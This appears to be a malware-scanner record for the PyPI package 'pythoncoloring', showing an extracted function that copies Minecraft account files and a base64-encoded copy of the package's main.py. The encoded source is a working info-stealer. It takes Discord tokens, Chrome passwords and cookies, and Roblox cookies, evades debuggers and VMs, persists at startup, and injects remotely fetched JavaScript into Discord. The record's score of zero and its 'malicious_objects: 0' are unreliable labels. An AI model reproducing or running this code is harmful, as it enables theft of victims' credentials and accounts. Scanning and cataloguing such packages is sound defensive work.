statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pythoncoloring/1.2.4/pythoncoloring-1.2.4/pythoncoloring-1.2.4/pythoncoloring/main.py
  contents:
  - name: LogCheckingXO.grabMinecraftCache
    score: 0.0
    code: |-
      def grabMinecraftCache(self):
              minecraft = ntpath.join(self.dir, 'Minecraft')
              os.makedirs(minecraft, exist_ok=True)
              mc = ntpath.join(self.roaming, '.minecraft')
              to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']

              for _file in to_grab:
                  if ntpath.exists(ntpath.join(mc, _file)):
                      shutil.copy2(ntpath.join(mc, _file), minecraft + self.sep + _file)
    tokens: resume load_global ntpath load_attr join load_fast self load_attr dir load_const Minecraft call store_fast minecraft load_global os load_attr makedirs load_fast minecraft load_const INTEGER kw_names exist_ok call pop_top load_global ntpath load_attr join load_fast self load_attr roaming load_const .minecraft call store_fast mc build_list load_const list_extend store_fast to_grab load_fast to_grab get_iter for_iter TO_NUMBER store_fast _file load_global ntpath load_attr exists load_global ntpath load_attr join load_fast mc load_fast _file call call pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_global shutil load_attr copy2 load_global ntpath load_attr join load_fast mc load_fast _file call load_fast minecraft load_fast self load_attr sep binary_op + load_fast _file binary_op + call pop_top jump_backward TO_NUMBER end_for return_const None
    hash: 3d0951c3139017ba0b576d8e5c6aceca5132ad0b5b79c8f78828058a46028e13
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/pythoncoloring/1.2.4/pythoncoloring-1.2.4/pythoncoloring-1.2.4/pythoncoloring/main.py
  : aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGN0eXBlcwppbXBvcnQganNvbgppbXBvcnQgbnRwYXRoCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCByZQppbXBvcnQgc2h1dGlsCmltcG9ydCBzcWxpdGUzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHdpbnJlZwppbXBvcnQgemlwZmlsZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lLCB0aW1lZGVsdGEsIHRpbWV6b25lCmZyb20gc3lzIGltcG9ydCBhcmd2CmZyb20gdGVtcGZpbGUgaW1wb3J0IGdldHRlbXBkaXIsIG1rZHRlbXAKCmltcG9ydCBodHRweAppbXBvcnQgcHN1dGlsCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKZnJvbSB3aW4zMmNyeXB0IGltcG9ydCBDcnlwdFVucHJvdGVjdERhdGEKCl9fYXV0aG9yX18gPSAiUmRpbW8iCl9fdmVyc2lvbl9fID0gJzEuOC44JwpfX2xpY2Vuc2VfXyA9ICJHUEwtMy4wIgpfX2NvbmZpZ19fID0gewogICAgIyByZXBsYWNlIFdFQkhPT0tfSEVSRSB3aXRoIHlvdXIgd2ViaG9vayDihpPihpMgb3IgdXNlIHRoZSBhcGkgZnJvbSBodHRwczovL2dpdGh1Yi5jb20vUmRpbW8vRGlzY29yZC1XZWJob29rLVByb3RlY3RvcgogICAgIyBSZWNvbW1lbmQgdXNpbmcgaHR0cHM6Ly9naXRodWIuY29tL1JkaW1vL0Rpc2NvcmQtV2ViaG9vay1Qcm90ZWN0b3Igc28geW91ciB3ZWJob29rIGNhbid0IGJlIHNwYW1tZWQgb3IgZGVsZXRlZAogICAgJ3dlYmhvb2snOiAid2hhdCBhYm91dCBob29raW5nIHVwIHNvbWUgYml0Y2hlcyBmaXJzdCIsCiAgICAjIE9OTFkgSEFWRSBUSEUgQkFTRTMyIEVOQ09ERUQgS0VZIEhFUkUgSUYgWU9VJ1JFIFVTSU5HIGh0dHBzOi8vZ2l0aHViLmNvbS9SZGltby9EaXNjb3JkLVdlYmhvb2stUHJvdGVjdG9yCiAgICAnd2ViaG9va19wcm90ZWN0b3Jfa2V5JzogIktFWV9IRVJFIiwKICAgICMga2VlcCBpdCBhcyBpdCBpcyB1bmxlc3MgeW91IHdhbnQgdG8gaGF2ZSBhIGN1c3RvbSBvbmUKICAgICdpbmplY3Rpb25fdXJsJzogImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SZGltby9EaXNjb3JkLUluamVjdGlvbi9tYXN0ZXIvaW5qZWN0aW9uLmpzIiwKICAgICMgaWYgVHJ1ZSwgaXQgd2lsbCBwaW5nIEBldmVyeW9uZSB3aGVuIHNvbWVvbmUgcmFuIEhhemFyZCB2MgogICAgJ3Bpbmdfb25fcnVuJzogVHJ1ZSwKICAgICMgc2V0IHRvIEZhbHNlIGlmIHlvdSBkb24ndCB3YW50IGl0IHRvIGtpbGwgcHJvZ3JhbXMgc3VjaCBhcyBkaXNjb3JkIHVwb24gcnVubmluZyB0aGUgZXhlCiAgICAna2lsbF9wcm9jZXNzZXMnOiBGYWxzZSwKICAgICMgaWYgeW91IHdhbnQgdGhlIGZpbGUgdG8gcnVuIGF0IHN0YXJ0dXAKICAgICdzdGFydHVwJzogVHJ1ZSwKICAgICMgaWYgeW91IHdhbnQgdGhlIGZpbGUgdG8gaGlkZSBpdHNlbGYgYWZ0ZXIgcnVuCiAgICAnaGlkZV9zZWxmJzogRmFsc2UsCiAgICAjIGRvZXMgaXQncyBiZXN0IHRvIHByZXZlbnQgdGhlIHByb2dyYW0gZnJvbSBiZWluZyBkZWJ1Z2dlZCBhbmQgZHJhc3RpY2FsbHkgcmVkdWNlcyB0aGUgY2hhbmdlcyBvZiB5b3VyIHdlYmhvb2sgYmVpbmcgZm91bmQKICAgICdhbnRpX2RlYnVnJzogVHJ1ZSwKICAgICMgdGhpcyBsaXN0IG9mIHByb2dyYW1zIHdpbGwgYmUga2lsbGVkIGlmIGhhemFyZCBkZXRlY3RzIHRoYXQgYW55IG9mIHRoZXNlIGFyZSBydW5uaW5nLCB5b3UgY2FuIGFkZCBtb3JlIGlmIHlvdSB3YW50CiAgICAnYmxhY2tMaXN0ZWRQcm9ncmFtcyc6CiAgICBbCiAgICAgICAgImh0dHBkZWJ1Z2dlcnVpIiwgIndpcmVzaGFyayIsICJmaWRkbGVyIiwgInJlZ2VkaXQiLCAiY21kIiwgInRhc2ttZ3IiLAogICAgICAgICJ2Ym94c2VydmljZSIsICJkZjVzZXJ2IiwgInByb2Nlc3NoYWNrZXIiLCAidmJveHRyYXkiLCAidm10b29sc2QiLCAidm13YXJldHJheSIsCiAgICAgICAgImlkYTY0IiwgIm9sbHlkYmciLCAicGVzdHVkaW8iLCAidm13YXJldXNlciIsICJ2Z2F1dGhzZXJ2aWNlIiwgInZtYWN0aGxwIiwKICAgICAgICAieDk2ZGJnIiwgInZtc3J2YyIsICJ4MzJkYmciLCAidm11c3J2YyIsICJwcmxfY2MiLCAicHJsX3Rvb2xzIiwgInhlbnNlcnZpY2UiLAogICAgICAgICJxZW11LWdhIiwgImpvZWJveGNvbnRyb2wiLCAia3NkdW1wZXJjbGllbnQiLCAia3NkdW1wZXIiLCAiam9lYm94c2VydmVyIgogICAgXQoKfQojIGdsb2JhbCB2YXJpYWJsZXMKVmljdGltID0gb3MuZ2V0bG9naW4oKQpWaWN0aW1fcGMgPSBvcy5nZXRlbnYoIkNPTVBVVEVSTkFNRSIpCnJhbSA9IHN0cihwc3V0aWwudmlydHVhbF9tZW1vcnkoKVswXSAvIDEwMjQgKiogMykuc3BsaXQoIi4iKVswXQpkaXNrID0gc3RyKHBzdXRpbC5kaXNrX3VzYWdlKCcvJylbMF0gLyAxMDI0ICoqIDMpLnNwbGl0KCIuIilbMF0KCgpjbGFzcyBGdW5jdGlvbnMob2JqZWN0KToKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBnZXRfbWFzdGVyX2tleShwYXRoOiBzdHIgb3Igb3MuUGF0aExpa2UpOgogICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGMgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICAgICAgcmV0dXJuIEZ1bmN0aW9ucy53aW5fZGVjcnlwdChtYXN0ZXJfa2V5WzU6XSkKICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGNvbnZlcnRfdGltZSh0aW1lOiBpbnQgb3IgZmxvYXQpIC0+IHN0cjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGVwb2NoID0gZGF0ZXRpbWUoMTYwMSwgMSwgMSwgdHppbmZvPXRpbWV6b25lLnV0YykKICAgICAgICAgICAgY29kZXN0YW1wID0gZXBvY2ggKyB0aW1lZGVsdGEobWljcm9zZWNvbmRzPXRpbWUpCiAgICAgICAgICAgIHJldHVybiBjb2Rlc3RhbXAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIHdpbl9kZWNyeXB0KGVuY3J5cHRlZF9zdHI6IGJ5dGVzKSAtPiBzdHI6CiAgICAgICAgcmV0dXJuIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfc3RyLCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBjcmVhdGVfdGVtcF9maWxlKF9kaXI6IHN0ciBvciBvcy5QYXRoTGlrZSA9IGdldHRlbXBkaXIoKSk6CiAgICAgICAgZmlsZV9uYW1lID0gJycuam9pbihyYW5kb20uU3lzdGVtUmFuZG9tKCkuY2hvaWNlKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OScpIGZvciBfIGluIHJhbmdlKHJhbmRvbS5yYW5kaW50KDEwLCAyMCkpKQogICAgICAgIHBhdGggPSBudHBhdGguam9pbihfZGlyLCBmaWxlX25hbWUpCiAgICAgICAgb3BlbihwYXRoLCAieCIpCiAgICAgICAgcmV0dXJuIHBhdGgKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZGVjcnlwdF92YWwoYnVmZiwgbWFzdGVyX2tleSkgLT4gc3RyOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuIGYnRmFpbGVkIHRvIGRlY3J5cHQgIntzdHIoYnVmZil9IiB8IGtleTogIntzdHIobWFzdGVyX2tleSl9IicKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZ2V0X2hlYWRlcnModG9rZW46IHN0ciA9IE5vbmUpOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgfQogICAgICAgIGlmIHRva2VuOgogICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pCiAgICAgICAgcmV0dXJuIGhlYWRlcnMKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgc3lzdGVtX2luZm8oKSAtPiBsaXN0OgogICAgICAgIGZsYWcgPSAweDA4MDAwMDAwCiAgICAgICAgc2gxID0gIndtaWMgY3Nwcm9kdWN0IGdldCB1dWlkIgogICAgICAgIHNoMiA9ICJwb3dlcnNoZWxsIEdldC1JdGVtUHJvcGVydHlWYWx1ZSAtUGF0aCAnSEtMTTpTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxTb2Z0d2FyZVByb3RlY3Rpb25QbGF0Zm9ybScgLU5hbWUgQmFja3VwUHJvZHVjdEtleURlZmF1bHQiCiAgICAgICAgc2gzID0gInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoICdIS0xNOlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uJyAtTmFtZSBQcm9kdWN0TmFtZSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIEhXSUQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDEsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkuc3BsaXQoJ1xuJylbMV0uc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIEhXSUQgPSAiTi9BIgogICAgICAgIHRyeToKICAgICAgICAgICAgd2tleSA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KHNoMiwgY3JlYXRpb25mbGFncz1mbGFnKS5kZWNvZGUoKS5yc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHdrZXkgPSAiTi9BIgogICAgICAgIHRyeToKICAgICAgICAgICAgd2ludmVyID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoc2gzLCBjcmVhdGlvbmZsYWdzPWZsYWcpLmRlY29kZSgpLnJzdHJpcCgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgd2ludmVyID0gIk4vQSIKICAgICAgICByZXR1cm4gW0hXSUQsIHdpbnZlciwgd2tleV0KCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgbmV0d29ya19pbmZvKCkgLT4gbGlzdDoKICAgICAgICBpcCwgY2l0eSwgY291bnRyeSwgcmVnaW9uLCBvcmcsIGxvYywgZ29vZ2xlbWFwID0gIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiCiAgICAgICAgcmVxID0gaHR0cHguZ2V0KCJodHRwczovL2lwaW5mby5pby9qc29uIikKICAgICAgICBpZiByZXEuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBkYXRhID0gcmVxLmpzb24oKQogICAgICAgICAgICBpcCA9IGRhdGEuZ2V0KCdpcCcpCiAgICAgICAgICAgIGNpdHkgPSBkYXRhLmdldCgnY2l0eScpCiAgICAgICAgICAgIGNvdW50cnkgPSBkYXRhLmdldCgnY291bnRyeScpCiAgICAgICAgICAgIHJlZ2lvbiA9IGRhdGEuZ2V0KCdyZWdpb24nKQogICAgICAgICAgICBvcmcgPSBkYXRhLmdldCgnb3JnJykKICAgICAgICAgICAgbG9jID0gZGF0YS5nZXQoJ2xvYycpCiAgICAgICAgICAgIGdvb2dsZW1hcCA9ICJodHRwczovL3d3dy5nb29nbGUuY29tL21hcHMvc2VhcmNoL2dvb2dsZSttYXArKyIgKyBsb2MKICAgICAgICByZXR1cm4gW2lwLCBjaXR5LCBjb3VudHJ5LCByZWdpb24sIG9yZywgbG9jLCBnb29nbGVtYXBdCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGZldGNoX2NvbmYoZTogc3RyKSAtPiBzdHIgb3IgYm9vbCB8IE5vbmU6CiAgICAgICAgcmV0dXJuIF9fY29uZmlnX18uZ2V0KGUpCgoKY2xhc3MgTG9nQ2hlY2tpbmdYTyhGdW5jdGlvbnMpOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYud2ViaG9vayA9IHNlbGYuZmV0Y2hfY29uZignd2ViaG9vaycpCiAgICAgICAgc2VsZi5kaXNjb3JkQXBpID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKICAgICAgICBzZWxmLmFwcGRhdGEgPSBvcy5nZXRlbnYoImxvY2FsYXBwZGF0YSIpCiAgICAgICAgc2VsZi5yb2FtaW5nID0gb3MuZ2V0ZW52KCJhcHBkYXRhIikKICAgICAgICBzZWxmLmNocm9tZV91c2VyX2RhdGEgPSBudHBhdGguam9pbihzZWxmLmFwcGRhdGEsICdHb29nbGUnLCAnQ2hyb21lJywgJ1VzZXIgRGF0YScpCiAgICAgICAgc2VsZi5kaXIsIHNlbGYudGVtcCA9IG1rZHRlbXAoKSwgZ2V0dGVtcGRpcigpCiAgICAgICAgaW5mLCBuZXQgPSBzZWxmLnN5c3RlbV9pbmZvKCksIHNlbGYubmV0d29ya19pbmZvKCkKICAgICAgICBzZWxmLmh3aWQsIHNlbGYud2ludmVyLCBzZWxmLndpbmtleSA9IGluZlswXSwgaW5mWzFdLCBpbmZbMl0KICAgICAgICBzZWxmLmlwLCBzZWxmLmNpdHksIHNlbGYuY291bnRyeSwgc2VsZi5yZWdpb24sIHNlbGYub3JnLCBzZWxmLmxvYywgc2VsZi5nb29nbGVtYXAgPSBuZXRbMF0sIG5ldFsxXSwgbmV0WzJdLCBuZXRbM10sIG5ldFs0XSwgbmV0WzVdLCBuZXRbNl0KICAgICAgICBzZWxmLnN0YXJ0dXBfbG9jID0gbnRwYXRoLmpvaW4oc2VsZi5yb2FtaW5nLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKCiAgICAgICAgc2VsZi5ob29rX3JlZyA9ICJhcGkvd2ViaG9va3MiCiAgICAgICAgc2VsZi5jaHJvbWVfcmVnID0gcmUuY29tcGlsZShyJyhecHJvZmlsZVxzXGQqKXxkZWZhdWx0fChndWVzdCBwcm9maWxlJCknLCByZS5JR05PUkVDQVNFIHwgcmUuTVVMVElMSU5FKQogICAgICAgIHNlbGYucmVnZXggPSByIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iCiAgICAgICAgc2VsZi5lbmNyeXB0ZWRfcmVnZXggPSByImRRdzR3OVdnWGNROlteXCJdKiIKCiAgICAgICAgc2VsZi5zZXAgPSBvcy5zZXAKICAgICAgICBzZWxmLnRva2VucyA9IFtdCiAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzID0gW10KICAgICAgICBzZWxmLmNocm9tZV9rZXkgPSBzZWxmLmdldF9tYXN0ZXJfa2V5KG50cGF0aC5qb2luKHNlbGYuY2hyb21lX3VzZXJfZGF0YSwgIkxvY2FsIFN0YXRlIikpCgogICAgICAgIG9zLm1ha2VkaXJzKHNlbGYuZGlyLCBleGlzdF9vaz1UcnVlKQoKICAgIGRlZiBoYXphcmRfZXhpdChzZWxmKToKICAgICAgICBzaHV0aWwucm10cmVlKHNlbGYuZGlyLCBpZ25vcmVfZXJyb3JzPVRydWUpCiAgICAgICAgb3MuX2V4aXQoMCkKCiAgICBkZWYgdHJ5X2V4dHJhY3QoZnVuYyk6CiAgICAgICAgJycnRGVjb3JhdG9yIHRvIHNhZmVseSBjYXRjaCBhbmQgaWdub3JlIGV4Y2VwdGlvbnMnJycKICAgICAgICBkZWYgd3JhcHBlcigqYXJncywgKiprd2FyZ3MpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICByZXR1cm4gd3JhcHBlcgoKICAgIGFzeW5jIGRlZiBjaGVja1Rva2VuKHNlbGYsIHRrbjogc3RyKSAtPiBzdHI6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByID0gaHR0cHguZ2V0KAogICAgICAgICAgICAgICAgdXJsPXNlbGYuZGlzY29yZEFwaSwKICAgICAgICAgICAgICAgIGhlYWRlcnM9c2VsZi5nZXRfaGVhZGVycyh0a24pLAogICAgICAgICAgICAgICAgdGltZW91dD01LjAKICAgICAgICAgICAgKQogICAgICAgIGV4Y2VwdCAoaHR0cHguQ29ubmVjdFRpbWVvdXQsIGh0dHB4LlRpbWVvdXRFeGNlcHRpb24pOgogICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgYW5kIHRrbiBub3QgaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0a24pCgogICAgYXN5bmMgZGVmIGluaXQoc2VsZik6CiAgICAgICAgaWYgc2VsZi53ZWJob29rID09ICIiIG9yIHNlbGYud2ViaG9vayA9PSAiXHg1N0VCSE9PS19IRVJFIjoKICAgICAgICAgICAgc2VsZi5oYXphcmRfZXhpdCgpCgogICAgICAgIGlmIF9fYXV0aG9yX18gIT0gIlx4NTJceDY0XHg2OVx4NmRceDZmIjoKICAgICAgICAgICAgc2VsZi5oYXphcmRfZXhpdCgpCgogICAgICAgIGlmIHNlbGYuZmV0Y2hfY29uZignYW50aV9kZWJ1ZycpIGFuZCBBbnRpRGVidWcoKS5pblZNIGlzIFRydWU6CiAgICAgICAgICAgIHNlbGYuaGF6YXJkX2V4aXQoKQoKICAgICAgICBhd2FpdCBzZWxmLmJ5cGFzc0JldHRlckRpc2NvcmQoKQogICAgICAgIGF3YWl0IHNlbGYuYnlwYXNzVG9rZW5Qcm90ZWN0b3IoKQoKICAgICAgICBmdW5jdGlvbl9saXN0ID0gW3NlbGYuc2NyZWVuc2hvdCwgc2VsZi5zeXNfZHVtcCwgc2VsZi5ncmFiX3Rva2Vucywgc2VsZi5ncmFiTWluZWNyYWZ0Q2FjaGUsIHNlbGYuZ3JhYlJvYmxveENvb2tpZV0KICAgICAgICBpZiBzZWxmLmZldGNoX2NvbmYoJ2hpZGVfc2VsZicpOgogICAgICAgICAgICBmdW5jdGlvbl9saXN0LmFwcGVuZChzZWxmLmhpZGUpCgogICAgICAgIGlmIHNlbGYuZmV0Y2hfY29uZigna2lsbF9wcm9jZXNzZXMnKToKICAgICAgICAgICAgYXdhaXQgc2VsZi5raWxsUHJvY2Vzc2VzKCkKCiAgICAgICAgaWYgc2VsZi5mZXRjaF9jb25mKCdzdGFydHVwJyk6CiAgICAgICAgICAgIGZ1bmN0aW9uX2xpc3QuYXBwZW5kKHNlbGYuc3RhcnR1cCkKCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhzZWxmLmNocm9tZV91c2VyX2RhdGEpIGFuZCBzZWxmLmNocm9tZV9rZXkgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIG9zLm1ha2VkaXJzKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJyksIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgIGZ1bmN0aW9uX2xpc3QuZXh0ZW5kKFtzZWxmLmdyYWJQYXNzd29yZCwgc2VsZi5ncmFiQ29va2llcywgc2VsZi5ncmFiSGlzdG9yeV0pCgogICAgICAgIGZvciBmdW5jIGluIGZ1bmN0aW9uX2xpc3Q6CiAgICAgICAgICAgIHByb2Nlc3MgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mdW5jLCBkYWVtb249VHJ1ZSkKICAgICAgICAgICAgcHJvY2Vzcy5zdGFydCgpCiAgICAgICAgZm9yIHQgaW4gdGhyZWFkaW5nLmVudW1lcmF0ZSgpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB0LmpvaW4oKQogICAgICAgICAgICBleGNlcHQgUnVudGltZUVycm9yOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBzZWxmLm5lYXRpZnlUb2tlbnMoKQogICAgICAgIGF3YWl0IHNlbGYuaW5qZWN0b3IoKQogICAgICAgIHNlbGYuZmluaXNoKCkKCiAgICBkZWYgaGlkZShzZWxmKToKICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldEZpbGVBdHRyaWJ1dGVzVyhhcmd2WzBdLCAyKQoKICAgIGRlZiBzdGFydHVwKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGFyZ3ZbMF0sIHNlbGYuc3RhcnR1cF9sb2MpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgIGFzeW5jIGRlZiBpbmplY3RvcihzZWxmKToKICAgICAgICAjIFRPIERPOiByZWR1Y2UgY29nbmV0aXZlIGNvbXBsZXhpdHkKICAgICAgICBmb3IgX2RpciBpbiBvcy5saXN0ZGlyKHNlbGYuYXBwZGF0YSk6CiAgICAgICAgICAgIGlmICdkaXNjb3JkJyBpbiBfZGlyLmxvd2VyKCkgYW5kIG50cGF0aC5pc2RpcihfZGlyKToKICAgICAgICAgICAgICAgIGRpc2NvcmQgPSBzZWxmLmFwcGRhdGEgKyBvcy5zZXAgKyBfZGlyCiAgICAgICAgICAgICAgICBmb3IgX19kaXIgaW4gb3MubGlzdGRpcihudHBhdGguYWJzcGF0aChkaXNjb3JkKSk6CiAgICAgICAgICAgICAgICAgICAgaWYgcmUubWF0Y2gocidhcHAtKFxkKlwuXGQqKSonLCBfX2Rpcik6CiAgICAgICAgICAgICAgICAgICAgICAgIGFwcCA9IG50cGF0aC5hYnNwYXRoKG50cGF0aC5qb2luKGRpc2NvcmQsIF9fZGlyKSkKICAgICAgICAgICAgICAgICAgICAgICAgbW9kdWxlcyA9IG50cGF0aC5qb2luKGFwcCwgJ21vZHVsZXMnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgbnRwYXRoLmV4aXN0cyhtb2R1bGVzKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgX19fZGlyIGluIG9zLmxpc3RkaXIobW9kdWxlcyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByZS5tYXRjaChyImRpc2NvcmRfZGVza3RvcF9jb3JlLVxkKyIsIF9fX2Rpcik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5qX3BhdGggPSBtb2R1bGVzICsgb3Muc2VwICsgX19fZGlyICsgZidcXGRpc2NvcmRfZGVza3RvcF9jb3JlXFwnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhpbmpfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuc3RhcnR1cF9sb2Mgbm90IGluIGFyZ3ZbMF06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoaW5qX3BhdGggKyAnaW5pdGlhdGlvbicsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5ob29rX3JlZyBpbiBzZWxmLndlYmhvb2s6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmID0gaHR0cHguZ2V0KHNlbGYuZmV0Y2hfY29uZignaW5qZWN0aW9uX3VybCcpKS50ZXh0LnJlcGxhY2UoIiVXRUJIT09LJSIsIHNlbGYud2ViaG9vaykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYgPSBodHRweC5nZXQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5mZXRjaF9jb25mKCdpbmplY3Rpb25fdXJsJykpLnRleHQucmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJVdFQkhPT0slIiwgc2VsZi53ZWJob29rKS5yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlV0VCSE9PS19LRVklIiwgc2VsZi5mZXRjaF9jb25mKCd3ZWJob29rX3Byb3RlY3Rvcl9rZXknKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGlual9wYXRoICsgJ2luZGV4LmpzJywgJ3cnLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGluZGV4RmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmRleEZpbGUud3JpdGUo